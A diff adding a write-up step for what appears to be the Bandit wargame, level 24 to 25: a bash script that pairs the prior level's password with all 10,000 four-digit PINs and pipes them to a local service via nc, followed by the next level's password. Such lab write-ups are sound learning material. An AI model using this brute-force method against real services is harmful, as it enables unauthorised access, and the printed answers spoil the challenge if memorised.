@@ -422,6 +422,24 @@ cat /tmp/shell/test.txt
 
 ## Level 24→ Level 25
 
+Brute force
+
+```
+#!/bin/bash
+
+bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ                     
+
+for i in {0..9999}
+    do
+        echo $bandit24 $i >> list.txt
+    done
+```
+```
+cat list.txt | nc localhost 30002
+```
+`uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`
+
+
 
 ## Level 25→ Level 26
 
